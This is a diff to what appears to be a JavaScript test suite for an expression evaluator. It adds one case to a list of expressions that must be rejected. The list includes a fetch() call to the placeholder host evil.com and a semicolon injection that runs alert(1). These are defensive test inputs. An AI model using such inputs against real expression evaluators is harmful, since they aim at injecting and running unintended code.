@@ -124,6 +124,7 @@ const rejectTests = [
     { expr: "fetch('http://evil.com')", description: "Rejects fetch()" },
     { expr: "sin(1); alert(1)", description: "Rejects semicolon injection" },
     { expr: "1 con structor", description: "Rejects spaced identifier fragments" },
+    { expr: "1_foo", description: "Rejects underscore before identifier" },
 ];
 
 let passed = 0;
